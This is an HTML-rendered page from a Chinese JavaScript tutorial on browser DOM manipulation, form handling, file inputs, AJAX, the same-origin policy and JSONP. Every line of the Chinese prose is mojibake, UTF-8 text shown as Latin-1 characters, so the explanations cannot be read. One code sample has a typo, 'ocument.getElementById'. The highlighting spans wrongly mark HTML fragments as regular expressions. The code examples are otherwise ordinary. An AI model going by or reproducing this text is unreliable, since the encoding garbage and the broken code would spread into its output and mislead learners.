<h3 id="history"><a href="#history" class="headerlink" title="history"></a>history</h3><p><code>history</code>å¯¹è±¡ä¿å­˜äº†æµè§ˆå™¨çš„å†å²è®°å½•ï¼ŒJavaScriptå¯ä»¥è°ƒç”¨<code>history</code>å¯¹è±¡çš„<code>back()</code>æˆ–<code>forward ()</code>ï¼Œç›¸å½“äºç”¨æˆ·ç‚¹å‡»äº†æµè§ˆå™¨çš„â€œåé€€â€æˆ–â€œå‰è¿›â€æŒ‰é’®ã€‚ä½†ç°åœ¨ä¸ä½¿ç”¨ã€‚</p>
<h2 id="æ“ä½œDOM"><a href="#æ“ä½œDOM" class="headerlink" title="æ“ä½œDOM"></a>æ“ä½œDOM</h2><p>ç”±äºHTMLæ–‡æ¡£è¢«æµè§ˆå™¨è§£æåå°±æ˜¯ä¸€æ£µDOMæ ‘ï¼Œè¦æ”¹å˜HTMLçš„ç»“æ„ï¼Œå°±éœ€è¦é€šè¿‡JavaScriptæ¥æ“ä½œDOMã€‚</p>
<p>å§‹ç»ˆè®°ä½DOMæ˜¯ä¸€ä¸ªæ ‘å½¢ç»“æ„ã€‚æ“ä½œä¸€ä¸ªDOMèŠ‚ç‚¹å®é™…ä¸Šå°±æ˜¯è¿™ä¹ˆå‡ ä¸ªæ“ä½œï¼š</p>
<ul>
<li>æ›´æ–°ï¼šæ›´æ–°è¯¥DOMèŠ‚ç‚¹çš„å†…å®¹ï¼Œç›¸å½“äºæ›´æ–°äº†è¯¥DOMèŠ‚ç‚¹è¡¨ç¤ºçš„HTMLçš„å†…å®¹ï¼›</li>
<li>éå†ï¼šéå†è¯¥DOMèŠ‚ç‚¹ä¸‹çš„å­èŠ‚ç‚¹ï¼Œä»¥ä¾¿è¿›è¡Œè¿›ä¸€æ­¥æ“ä½œï¼›</li>
<li>æ·»åŠ ï¼šåœ¨è¯¥DOMèŠ‚ç‚¹ä¸‹æ–°å¢ä¸€ä¸ªå­èŠ‚ç‚¹ï¼Œç›¸å½“äºåŠ¨æ€å¢åŠ äº†ä¸€ä¸ªHTMLèŠ‚ç‚¹ï¼›</li>
<li>åˆ é™¤ï¼šå°†è¯¥èŠ‚ç‚¹ä»HTMLä¸­åˆ é™¤ï¼Œç›¸å½“äºåˆ æ‰äº†è¯¥DOMèŠ‚ç‚¹çš„å†…å®¹ä»¥åŠå®ƒåŒ…å«çš„æ‰€æœ‰å­èŠ‚ç‚¹ã€‚</li>
</ul>
<p>åœ¨æ“ä½œä¸€ä¸ªDOMèŠ‚ç‚¹å‰ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡å„ç§æ–¹å¼å…ˆæ‹¿åˆ°è¿™ä¸ªDOMèŠ‚ç‚¹ã€‚æœ€å¸¸ç”¨çš„æ–¹æ³•æ˜¯<code>document.getElementById()</code>å’Œ<code>document.getElementsByTagName()</code>ï¼Œä»¥åŠCSSé€‰æ‹©å™¨<code>document.getElementsByClassName()</code>ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.getElementById(&#39;test&#39;);  &#x2F;&#x2F; è¿”å›IDä¸º&#39;test&#39;çš„èŠ‚ç‚¹ï¼š</span><br><span class="line">ocument.getElementById(&#39;test-table&#39;).getElementsByTagName(&#39;tr&#39;);  &#x2F;&#x2F; å…ˆå®šä½IDä¸º&#39;test-table&#39;çš„èŠ‚ç‚¹ï¼Œå†è¿”å›å…¶å†…éƒ¨æ‰€æœ‰trèŠ‚ç‚¹ï¼š</span><br><span class="line">document.getElementById(&#39;test-div&#39;).getElementsByClassName(&#39;red&#39;);  &#x2F;&#x2F; å…ˆå®šä½IDä¸º&#39;test-div&#39;çš„èŠ‚ç‚¹ï¼Œå†è¿”å›å…¶å†…éƒ¨æ‰€æœ‰classåŒ…å«redçš„èŠ‚ç‚¹ï¼š</span><br><span class="line">test.firstElementChild &#x2F;&#x2F;testä¸‹ç¬¬ä¸€ä¸ªç»“ç‚¹</span><br><span class="line">test.lastElementChild  &#x2F;&#x2F;testä¸‹æœ€åä¸€ä¸ªç»“ç‚¹</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒç§æ–¹æ³•æ˜¯ä½¿ç”¨<code>querySelector()</code>å’Œ<code>querySelectorAll()</code>ï¼Œéœ€è¦äº†è§£selectorè¯­æ³•ï¼Œç„¶åä½¿ç”¨æ¡ä»¶æ¥è·å–èŠ‚ç‚¹ï¼Œæ›´åŠ æ–¹ä¾¿ã€‚</p>
<p><strong>ä½œä¸š</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- HTMLç»“æ„ --&gt;</span><br><span class="line">&lt;div id=<span class="string">"test-div"</span>&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"c-red"</span>&gt;</span><br><span class="line">    &lt;p id=<span class="string">"test-p"</span>&gt;JavaScript&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p&gt;Java&lt;/</span>p&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;div class="c-red c-green"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p&gt;Python&lt;/</span>p&gt;</span><br><span class="line">    &lt;p&gt;Ruby&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p&gt;Swift&lt;/</span>p&gt;</span><br><span class="line">  &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;div class="c-green"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p&gt;Scheme&lt;/</span>p&gt;</span><br><span class="line">    &lt;p&gt;Haskell&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">/</span><span class="regexp">/ é€‰æ‹©&lt;p&gt;JavaScript&lt;/</span>p&gt;:</span><br><span class="line"><span class="keyword">var</span> js = <span class="built_in">document</span>.getElementById(<span class="string">'test-p'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€‰æ‹©&lt;p&gt;Python&lt;/p&gt;,&lt;p&gt;Ruby&lt;/p&gt;,&lt;p&gt;Swift&lt;/p&gt;:</span></span><br><span class="line"><span class="keyword">var</span> arr = <span class="built_in">document</span>.getElementsByClassName(<span class="string">'c-red'</span>)[<span class="number">1</span>].getElementsByTagName(<span class="string">'p'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€‰æ‹©&lt;p&gt;Haskell&lt;/p&gt;:</span></span><br><span class="line"><span class="keyword">var</span> haskell = <span class="built_in">document</span>.getElementsByClassName(<span class="string">'c-green'</span>)[<span class="number">1</span>].lastElementChild;</span><br></pre></td></tr></table></figure>
<h3 id="æ›´æ–°DOM"><a href="#æ›´æ–°DOM" class="headerlink" title="æ›´æ–°DOM"></a>æ›´æ–°DOM</h3><p>ä¸€ç§æ˜¯ä¿®æ”¹<code>innerHTML</code>å±æ€§ï¼Œè¿™ä¸ªæ–¹å¼éå¸¸å¼ºå¤§ï¼Œä¸ä½†å¯ä»¥ä¿®æ”¹ä¸€ä¸ªDOMèŠ‚ç‚¹çš„æ–‡æœ¬å†…å®¹ï¼Œè¿˜å¯ä»¥ç›´æ¥é€šè¿‡HTMLç‰‡æ®µä¿®æ”¹DOMèŠ‚ç‚¹å†…éƒ¨çš„å­æ ‘</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;è·å–&lt;p id &#x3D; &#39;p&#39;&gt;...&lt;&#x2F;p&gt;</span><br><span class="line">var p &#x3D; document.getElementById(&#39;p&#39;);</span><br><span class="line">p.innerHTML &#x3D; &#39;ABC&#39;</span><br><span class="line">&#x2F;&#x2F;&lt;p id &#x3D; &#39;p&#39;&gt;ABC&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒç§æ˜¯ä¿®æ”¹<code>innerText</code>æˆ–<code>textContent</code>å±æ€§ï¼Œè¿™æ ·å¯ä»¥è‡ªåŠ¨å¯¹å­—ç¬¦ä¸²è¿›è¡ŒHTMLç¼–ç ï¼Œä¿è¯æ— æ³•è®¾ç½®ä»»ä½•HTMLæ ‡ç­¾</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; è·å–&lt;p id&#x3D;&quot;p-id&quot;&gt;...&lt;&#x2F;p&gt;</span><br><span class="line">var p &#x3D; document.getElementById(&#39;p-id&#39;);</span><br><span class="line">&#x2F;&#x2F; è®¾ç½®æ–‡æœ¬:</span><br><span class="line">p.innerText &#x3D; &#39;&lt;script&gt;alert(&quot;Hi&quot;)&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#x2F;&#x2F; HTMLè¢«è‡ªåŠ¨ç¼–ç ï¼Œæ— æ³•è®¾ç½®ä¸€ä¸ª&lt;script&gt;èŠ‚ç‚¹:</span><br><span class="line">&#x2F;&#x2F; &lt;p id&#x3D;&quot;p-id&quot;&gt;&lt;script&gt;alert(&quot;Hi&quot;)&lt;&#x2F;script&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
<h3 id="æ’å…¥DOM"><a href="#æ’å…¥DOM" class="headerlink" title="æ’å…¥DOM"></a>æ’å…¥DOM</h3><p>ä¸€ä¸ªæ˜¯ä½¿ç”¨<code>appendChild</code>ï¼ŒæŠŠä¸€ä¸ªå­èŠ‚ç‚¹æ·»åŠ åˆ°çˆ¶èŠ‚ç‚¹çš„æœ€åä¸€ä¸ªå­èŠ‚ç‚¹ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- HTMLç»“æ„ --&gt;</span><br><span class="line">&lt;p id=<span class="string">"js"</span>&gt;JavaScript&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">&lt;div id="list"&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p id="java"&gt;Java&lt;/</span>p&gt;</span><br><span class="line">    &lt;p id=<span class="string">"python"</span>&gt;Python&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p id="scheme"&gt;Scheme&lt;/</span>p&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">var list = document.getElementById('list');</span></span><br><span class="line"><span class="regexp">js = document.createElement('p');</span></span><br><span class="line"><span class="regexp">js.id = 'js';</span></span><br><span class="line"><span class="regexp">js.innerText = 'javascript';</span></span><br><span class="line"><span class="regexp">list.appendChild(js);</span></span><br></pre></td></tr></table></figure>
<p>å¦ä¸€ä¸ªæ˜¯<code>insertBefore</code>ï¼Œå¯ä»¥ä½¿ç”¨<code>parentElement.insertBefore(newElement, referenceElement);</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span></span><br><span class="line">    list = <span class="built_in">document</span>.getElementById(<span class="string">'list'</span>),</span><br><span class="line">    ref = <span class="built_in">document</span>.getElementById(<span class="string">'python'</span>),</span><br><span class="line">    haskell = <span class="built_in">document</span>.createElement(<span class="string">'p'</span>);</span><br><span class="line">haskell.id = <span class="string">'haskell'</span>;</span><br><span class="line">haskell.innerText = <span class="string">'Haskell'</span>;</span><br><span class="line">list.insertBefore(haskell, ref);</span><br></pre></td></tr></table></figure>
<h3 id="åˆ é™¤DOM"><a href="#åˆ é™¤DOM" class="headerlink" title="åˆ é™¤DOM"></a>åˆ é™¤DOM</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">"parent"</span>&gt;</span><br><span class="line">    &lt;p&gt;First&lt;<span class="regexp">/p&gt;</span></span><br><span class="line"><span class="regexp">    &lt;p&gt;Second&lt;/</span>p&gt;</span><br><span class="line">&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">var parent = document.getElementById('parent');</span></span><br><span class="line"><span class="regexp">parent.removeChild(parent.children[0]);</span></span><br><span class="line"><span class="regexp">parent.removeChild(parent.children[1]); /</span><span class="regexp">/ &lt;-- æµè§ˆå™¨æŠ¥é”™</span></span><br></pre></td></tr></table></figure>
<p>æµè§ˆå™¨æŠ¥é”™ï¼š<code>parent.children[1]</code>ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„èŠ‚ç‚¹ã€‚åŸå› å°±åœ¨äºï¼Œå½“<code>&lt;p&gt;First&lt;/p&gt;</code>èŠ‚ç‚¹è¢«åˆ é™¤åï¼Œ<code>parent.children</code>çš„èŠ‚ç‚¹æ•°é‡å·²ç»ä»2å˜ä¸ºäº†1ï¼Œç´¢å¼•<code>[1]</code>å·²ç»ä¸å­˜åœ¨äº†ã€‚</p>
<h2 id="æ“ä½œè¡¨å•"><a href="#æ“ä½œè¡¨å•" class="headerlink" title="æ“ä½œè¡¨å•"></a>æ“ä½œè¡¨å•</h2><p>HTMLè¡¨å•çš„è¾“å…¥æ§ä»¶ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p>
<ul>
<li>æ–‡æœ¬æ¡†ï¼Œå¯¹åº”çš„<code>&lt;input type=&quot;text&quot;&gt;</code>ï¼Œç”¨äºè¾“å…¥æ–‡æœ¬ï¼›</li>
<li>å£ä»¤æ¡†ï¼Œå¯¹åº”çš„<code>&lt;input type=&quot;password&quot;&gt;</code>ï¼Œç”¨äºè¾“å…¥å£ä»¤ï¼›</li>
<li>å•é€‰æ¡†ï¼Œå¯¹åº”çš„<code>&lt;input type=&quot;radio&quot;&gt;</code>ï¼Œç”¨äºé€‰æ‹©ä¸€é¡¹ï¼›</li>
<li>å¤é€‰æ¡†ï¼Œå¯¹åº”çš„<code>&lt;input type=&quot;checkbox&quot;&gt;</code>ï¼Œç”¨äºé€‰æ‹©å¤šé¡¹ï¼›</li>
<li>ä¸‹æ‹‰æ¡†ï¼Œå¯¹åº”çš„<code>&lt;select&gt;</code>ï¼Œç”¨äºé€‰æ‹©ä¸€é¡¹ï¼›</li>
<li>éšè—æ–‡æœ¬ï¼Œå¯¹åº”çš„<code>&lt;input type=&quot;hidden&quot;&gt;</code>ï¼Œç”¨æˆ·ä¸å¯è§ï¼Œä½†è¡¨å•æäº¤æ—¶ä¼šæŠŠéšè—æ–‡æœ¬å‘é€åˆ°æœåŠ¡å™¨ã€‚</li>
</ul>
<h3 id="è·å–å€¼"><a href="#è·å–å€¼" class="headerlink" title="è·å–å€¼"></a>è·å–å€¼</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var input &#x3D; document.getElementById(&#39;email&#39;);</span><br><span class="line">input.value  &#x2F;&#x2F;ç”¨æˆ·è¾“å…¥çš„å€¼</span><br></pre></td></tr></table></figure>
<h3 id="è®¾ç½®å€¼"><a href="#è®¾ç½®å€¼" class="headerlink" title="è®¾ç½®å€¼"></a>è®¾ç½®å€¼</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var input &#x3D; document.getElementById(&#39;email&#39;);</span><br><span class="line">input.value &#x3D; &#39;test&#39;;  &#x2F;&#x2F;æ–‡æœ¬æ¡†å†…å®¹å·²è¢«è®¾ç½®</span><br></pre></td></tr></table></figure>
<h3 id="HTML5æ§ä»¶"><a href="#HTML5æ§ä»¶" class="headerlink" title="HTML5æ§ä»¶"></a>HTML5æ§ä»¶</h3><p>HTML5æ–°å¢äº†å¤§é‡æ ‡å‡†æ§ä»¶ï¼Œå¸¸ç”¨çš„åŒ…æ‹¬<code>date</code>ã€<code>datetime</code>ã€<code>datetime-local</code>ã€<code>color</code>ç­‰ï¼Œå®ƒä»¬éƒ½ä½¿ç”¨<code>&lt;input&gt;</code>æ ‡ç­¾ã€‚</p>
<h3 id="æäº¤è¡¨å•"><a href="#æäº¤è¡¨å•" class="headerlink" title="æäº¤è¡¨å•"></a>æäº¤è¡¨å•</h3><p>æ–¹å¼ä¸€æ˜¯é€šè¿‡<code>&lt;form&gt;</code>å…ƒç´ çš„<code>submit()</code>æ–¹æ³•æäº¤ä¸€ä¸ªè¡¨å•ï¼Œä¾‹å¦‚ï¼Œå“åº”ä¸€ä¸ª<code>&lt;button&gt;</code>çš„<code>click</code>äº‹ä»¶ï¼Œåœ¨JavaScriptä»£ç ä¸­æäº¤è¡¨å•ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- HTML --&gt;</span><br><span class="line">&lt;form id=<span class="string">"test-form"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"test"</span>&gt;</span><br><span class="line">    &lt;button type=<span class="string">"button"</span> onclick=<span class="string">"doSubmitForm()"</span>&gt;Submit&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSubmitForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">'test-form'</span>);</span><br><span class="line">    <span class="comment">// å¯ä»¥åœ¨æ­¤ä¿®æ”¹formçš„input...</span></span><br><span class="line">    <span class="comment">// æäº¤form:</span></span><br><span class="line">    form.submit();</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒç§æ–¹å¼æ˜¯å“åº”<code>&lt;form&gt;</code>æœ¬èº«çš„<code>onsubmit</code>äº‹ä»¶ï¼Œåœ¨æäº¤formæ—¶ä½œä¿®æ”¹ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;!-- HTML --&gt;</span><br><span class="line">&lt;form id=<span class="string">"test-form"</span> onsubmit=<span class="string">"return checkForm()"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> name=<span class="string">"test"</span>&gt;</span><br><span class="line">    &lt;button type=<span class="string">"submit"</span>&gt;Submit&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkForm</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> form = <span class="built_in">document</span>.getElementById(<span class="string">'test-form'</span>);</span><br><span class="line">    <span class="comment">// å¯ä»¥åœ¨æ­¤ä¿®æ”¹formçš„input...</span></span><br><span class="line">    <span class="comment">// ç»§ç»­ä¸‹ä¸€æ­¥:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="æ“ä½œæ–‡ä»¶"><a href="#æ“ä½œæ–‡ä»¶" class="headerlink" title="æ“ä½œæ–‡ä»¶"></a>æ“ä½œæ–‡ä»¶</h2><p>åœ¨HTMLè¡¨å•ä¸­ï¼Œå¯ä»¥ä¸Šä¼ æ–‡ä»¶çš„å”¯ä¸€æ§ä»¶å°±æ˜¯<code>&lt;input type=&quot;file&quot;&gt;</code>ã€‚</p>
<p><em>æ³¨æ„</em>ï¼šå½“ä¸€ä¸ªè¡¨å•åŒ…å«<code>&lt;input type=&quot;file&quot;&gt;</code>æ—¶ï¼Œè¡¨å•çš„<code>enctype</code>å¿…é¡»æŒ‡å®šä¸º<code>multipart/form-data</code>ï¼Œ<code>method</code>å¿…é¡»æŒ‡å®šä¸º<code>post</code>ï¼Œæµè§ˆå™¨æ‰èƒ½æ­£ç¡®ç¼–ç å¹¶ä»¥<code>multipart/form-data</code>æ ¼å¼å‘é€è¡¨å•çš„æ•°æ®ã€‚</p>
<p>å‡ºäºå®‰å…¨è€ƒè™‘ï¼Œæµè§ˆå™¨åªå…è®¸ç”¨æˆ·ç‚¹å‡»<code>&lt;input type=&quot;file&quot;&gt;</code>æ¥é€‰æ‹©æœ¬åœ°æ–‡ä»¶ï¼Œç”¨JavaScriptå¯¹<code>&lt;input type=&quot;file&quot;&gt;</code>çš„<code>value</code>èµ‹å€¼æ˜¯æ²¡æœ‰ä»»ä½•æ•ˆæœçš„ã€‚å½“ç”¨æˆ·é€‰æ‹©äº†ä¸Šä¼ æŸä¸ªæ–‡ä»¶åï¼ŒJavaScriptä¹Ÿæ— æ³•è·å¾—è¯¥æ–‡ä»¶çš„çœŸå®è·¯å¾„ã€‚</p>
<h2 id="AJAX"><a href="#AJAX" class="headerlink" title="*AJAX"></a>*AJAX</h2><p>å¦‚æœè¦è®©ç”¨æˆ·ç•™åœ¨å½“å‰é¡µé¢ä¸­ï¼ŒåŒæ—¶å‘å‡ºæ–°çš„HTTPè¯·æ±‚ï¼Œå°±å¿…é¡»ç”¨JavaScriptå‘é€è¿™ä¸ªæ–°è¯·æ±‚ï¼Œæ¥æ”¶åˆ°æ•°æ®åï¼Œå†ç”¨JavaScriptæ›´æ–°é¡µé¢ï¼Œè¿™æ ·ä¸€æ¥ï¼Œç”¨æˆ·å°±æ„Ÿè§‰è‡ªå·±ä»ç„¶åœç•™åœ¨å½“å‰é¡µé¢ï¼Œä½†æ˜¯æ•°æ®å´å¯ä»¥ä¸æ–­åœ°æ›´æ–°ã€‚</p>
<p>ç”¨JavaScriptå†™ä¸€ä¸ªå®Œæ•´çš„AJAXä»£ç å¹¶ä¸å¤æ‚ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„ï¼š<strong>AJAXè¯·æ±‚æ˜¯å¼‚æ­¥æ‰§è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¦é€šè¿‡å›è°ƒå‡½æ•°è·å¾—å“åº”</strong>ã€‚</p>
<p>å½“åˆ›å»ºäº†<code>XMLHttpRequest</code>å¯¹è±¡åï¼Œè¦å…ˆè®¾ç½®<code>onreadystatechange</code>çš„å›è°ƒå‡½æ•°ã€‚åœ¨å›è°ƒå‡½æ•°ä¸­ï¼Œé€šå¸¸æˆ‘ä»¬åªéœ€é€šè¿‡<code>readyState === 4</code>åˆ¤æ–­è¯·æ±‚æ˜¯å¦å®Œæˆï¼Œå¦‚æœå·²å®Œæˆï¼Œå†æ ¹æ®<code>status === 200</code>åˆ¤æ–­æ˜¯å¦æ˜¯ä¸€ä¸ªæˆåŠŸçš„å“åº”ã€‚</p>
<p><code>XMLHttpRequest</code>å¯¹è±¡çš„<code>open()</code>æ–¹æ³•æœ‰3ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šæ˜¯<code>GET</code>è¿˜æ˜¯<code>POST</code>ï¼Œç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šURLåœ°å€ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡å®šæ˜¯å¦ä½¿ç”¨å¼‚æ­¥ï¼Œé»˜è®¤æ˜¯<code>true</code>ï¼Œæ‰€ä»¥ä¸ç”¨å†™ã€‚</p>
<p><em>æ³¨æ„</em>ï¼Œåƒä¸‡ä¸è¦æŠŠç¬¬ä¸‰ä¸ªå‚æ•°æŒ‡å®šä¸º<code>false</code>ï¼Œå¦åˆ™æµè§ˆå™¨å°†åœæ­¢å“åº”ï¼Œç›´åˆ°AJAXè¯·æ±‚å®Œæˆã€‚å¦‚æœè¿™ä¸ªè¯·æ±‚è€—æ—¶10ç§’ï¼Œé‚£ä¹ˆ10ç§’å†…ä½ ä¼šå‘ç°æµè§ˆå™¨å¤„äºâ€œå‡æ­»â€çŠ¶æ€ã€‚</p>
<p>æœ€åè°ƒç”¨<code>send()</code>æ–¹æ³•æ‰çœŸæ­£å‘é€è¯·æ±‚ã€‚<code>GET</code>è¯·æ±‚ä¸éœ€è¦å‚æ•°ï¼Œ<code>POST</code>è¯·æ±‚éœ€è¦æŠŠbodyéƒ¨åˆ†ä»¥å­—ç¬¦ä¸²æˆ–è€…<code>FormData</code>å¯¹è±¡ä¼ è¿›å»ã€‚</p>
<p><strong>å®‰å…¨é™åˆ¶</strong></p>
<p>ä¸Šé¢ä»£ç çš„URLä½¿ç”¨çš„æ˜¯ç›¸å¯¹è·¯å¾„ã€‚å¦‚æœä½ æŠŠå®ƒæ”¹ä¸º<code>&#39;http://www.sina.com.cn/&#39;</code>ï¼Œå†è¿è¡Œï¼Œè‚¯å®šæŠ¥é”™ã€‚åœ¨Chromeçš„æ§åˆ¶å°é‡Œï¼Œè¿˜å¯ä»¥çœ‹åˆ°é”™è¯¯ä¿¡æ¯ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ<strong>JavaScriptåœ¨å‘é€AJAXè¯·æ±‚æ—¶ï¼ŒURLçš„åŸŸåå¿…é¡»å’Œå½“å‰é¡µé¢å®Œå…¨ä¸€è‡´ã€‚å®Œå…¨ä¸€è‡´çš„æ„æ€æ˜¯ï¼ŒåŸŸåè¦ç›¸åŒï¼ˆ<code>www.example.com</code>å’Œ<code>example.com</code>ä¸åŒï¼‰ï¼Œåè®®è¦ç›¸åŒï¼ˆ<code>http</code>å’Œ<code>https</code>ä¸åŒï¼‰ï¼Œç«¯å£å·è¦ç›¸åŒï¼ˆé»˜è®¤æ˜¯<code>:80</code>ç«¯å£ï¼Œå®ƒå’Œ<code>:8080</code>å°±ä¸åŒï¼‰ã€‚</strong>æœ‰çš„æµè§ˆå™¨å£å­æ¾ä¸€ç‚¹ï¼Œå…è®¸ç«¯å£ä¸åŒï¼Œå¤§å¤šæ•°æµè§ˆå™¨éƒ½ä¼šä¸¥æ ¼éµå®ˆè¿™ä¸ªé™åˆ¶ã€‚</p>
<p>JSè¯·æ±‚å¤–åŸŸçš„URLï¼š</p>
<p>ä¸€æ˜¯é€šè¿‡Flashæ’ä»¶å‘é€HTTPè¯·æ±‚ï¼Œè¿™ç§æ–¹å¼å¯ä»¥ç»•è¿‡æµè§ˆå™¨çš„å®‰å…¨é™åˆ¶ï¼Œä½†å¿…é¡»å®‰è£…Flashï¼Œå¹¶ä¸”è·ŸFlashäº¤äº’ã€‚ä¸è¿‡Flashç”¨èµ·æ¥éº»çƒ¦ï¼Œè€Œä¸”ç°åœ¨ç”¨å¾—ä¹Ÿè¶Šæ¥è¶Šå°‘äº†ã€‚</p>
<p>äºŒæ˜¯é€šè¿‡åœ¨åŒæºåŸŸåä¸‹æ¶è®¾ä¸€ä¸ªä»£ç†æœåŠ¡å™¨æ¥è½¬å‘ï¼ŒJavaScriptè´Ÿè´£æŠŠè¯·æ±‚å‘é€åˆ°ä»£ç†æœåŠ¡å™¨ï¼šä»£ç†æœåŠ¡å™¨å†æŠŠç»“æœè¿”å›ï¼Œè¿™æ ·å°±éµå®ˆäº†æµè§ˆå™¨çš„åŒæºç­–ç•¥ã€‚è¿™ç§æ–¹å¼éº»çƒ¦ä¹‹å¤„åœ¨äºéœ€è¦æœåŠ¡å™¨ç«¯é¢å¤–åšå¼€å‘ã€‚</p>
<p>ç¬¬ä¸‰ç§æ–¹å¼ç§°ä¸ºJSONPï¼Œå®ƒæœ‰ä¸ªé™åˆ¶ï¼Œåªèƒ½ç”¨GETè¯·æ±‚ï¼Œå¹¶ä¸”è¦æ±‚è¿”å›JavaScriptã€‚è¿™ç§æ–¹å¼è·¨åŸŸå®é™…ä¸Šæ˜¯åˆ©ç”¨äº†æµè§ˆå™¨å…è®¸è·¨åŸŸå¼•ç”¨JavaScriptèµ„æºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;example.com&#x2F;abc.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    ...</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">...</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>JSONPé€šå¸¸ä»¥å‡½æ•°è°ƒç”¨çš„å½¢å¼è¿”å›ï¼Œä¾‹å¦‚ï¼Œè¿”å›JavaScriptå†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foo(&#39;data&#39;);</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å¦‚æœåœ¨é¡µé¢ä¸­å…ˆå‡†å¤‡å¥½<code>foo()</code>å‡½æ•°ï¼Œç„¶åç»™é¡µé¢åŠ¨æ€åŠ ä¸€ä¸ª<code>&lt;script&gt;</code>èŠ‚ç‚¹ï¼Œç›¸å½“äºåŠ¨æ€è¯»å–å¤–åŸŸçš„JavaScriptèµ„æºï¼Œæœ€åå°±ç­‰ç€æ¥æ”¶å›è°ƒäº†ã€‚</p>
<p>ä»¥163çš„è‚¡ç¥¨æŸ¥è¯¢URLä¸ºä¾‹ï¼Œå¯¹äºURLï¼š<a href="http://api.money.126.net/data/feed/0000001,1399001?callback=refreshPriceï¼Œä½ å°†å¾—åˆ°å¦‚ä¸‹è¿”å›ï¼š" target="_blank" rel="noopener">http://api.money.126.net/data/feed/0000001,1399001?callback=refreshPriceï¼Œä½ å°†å¾—åˆ°å¦‚ä¸‹è¿”å›ï¼š</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">refreshPrice(&#123;&quot;0000001&quot;:&#123;&quot;code&quot;: &quot;0000001&quot;, ... &#125;);</span><br></pre></td></tr></table></figure>
